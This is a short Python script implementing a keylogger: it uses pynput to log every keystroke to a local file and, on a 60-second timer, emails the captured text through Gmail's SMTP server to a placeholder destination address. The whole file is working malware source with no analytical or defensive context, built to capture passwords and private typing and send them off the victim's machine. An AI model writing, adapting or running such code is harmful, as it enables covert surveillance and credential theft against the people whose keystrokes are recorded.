from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer
import os

# Set the email parameters
EMAIL_ORIGINAL= "YOUR_EMAIL"
EMAIL_DESTINY= "DESTINY_EMAIL"
EMAIL_PASSWORD= "YOUR_PASSWORD"

def send_email():
    # Read the contents of the keylog file
    if os.path.exists("keylog.txt"):
        with open("keylog.txt", "r", encoding="utf-8") as log_file:
            keylog_content = log_file.read()

        if keylog_content.strip():  

            msg = MIMEText(keylog_content)
            msg['Subject'] = 'Keylogger Report'
            msg['From'] = EMAIL_ORIGINAL
            msg['To'] = EMAIL_DESTINY

            try:
                with smtplib.SMTP('smtp.gmail.com', 587) as server:
                    server.starttls()
                    server.login(EMAIL_ORIGINAL, EMAIL_PASSWORD)
                    server.send_message(msg)
                    print("Email sent successfully.")

            except Exception as e:
                print(f"Failed to send email: {e}")
    else:

        print("Arquivo keylog.txt ainda não criado. Aguardando digitação...")

    #Timer to send the email every 60 seconds
    Timer(60, send_email).start()

def on_press(key):
    try:
        #normal character keys
        with open("keylog.txt", "a", encoding="utf-8") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open("keylog.txt", "a", encoding="utf-8") as log_file:
            if key == keyboard.Key.space:
                log_file.write(" ")
            elif key == keyboard.Key.backspace:
                log_file.write("[BACKSPACE]")
            elif key == keyboard.Key.enter:
                log_file.write("\n")
            elif key == keyboard.Key.tab:
                log_file.write("\t")
            else:
                log_file.write(f"[{key}]")

# Start the keylogger and email sending
with keyboard.Listener(on_press=on_press) as listener:
    send_email()  # Start the email sending timer
    listener.join()